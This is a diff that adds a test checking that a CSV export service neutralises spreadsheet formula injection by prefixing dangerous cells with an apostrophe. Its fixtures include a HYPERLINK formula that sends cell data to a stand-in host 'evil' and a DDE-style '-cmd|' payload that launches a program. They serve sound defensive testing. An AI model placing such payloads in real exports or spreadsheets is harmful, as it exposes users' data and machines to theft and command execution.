@@ -66,6 +66,29 @@ describe("TransferService.export", () => {
     assert.match(file.filename, /^Server-\d{4}-\d{2}-\d{2}\.csv$/);
   });
 
+  it("defuses spreadsheet formulas in a CSV export, keeping plain numbers", async () => {
+    const csv = [
+      "﻿id,title,delta",
+      `1,"=HYPERLINK(""http://evil/?""&A1,""Click"")",-5`,
+      "2,@SUM(A1),+3.2",
+      `3,"-cmd|' /C calc'!A0",ok`,
+      "",
+    ].join("\n");
+    const service = new TransferService(
+      client(new Response(csv, { headers: { "content-type": "text/csv", "content-disposition": "attachment" } })),
+      sampleSchema(),
+    );
+    const file = await service.export("Server", "SELECT Server", "csv");
+    const text = new TextDecoder("utf-8", { ignoreBOM: true }).decode(await new Response(file.body).arrayBuffer());
+    assert.ok(text.startsWith("﻿"), "the byte-order mark stays");
+    assert.deepEqual(parseCsv(text.slice(1), ",", '"'), [
+      ["id", "title", "delta"],
+      ["1", `'=HYPERLINK("http://evil/?"&A1,"Click")`, "-5"],
+      ["2", "'@SUM(A1)", "+3.2"],
+      ["3", "'-cmd|' /C calc'!A0", "ok"],
+    ]);
+  });
+
   it("reports the page iTop rendered instead of a file", async () => {
     const service = new TransferService(
       client(new Response("<html><body>Error: Invalid OQL</body></html>", { headers: { "content-type": "text/html" } })),
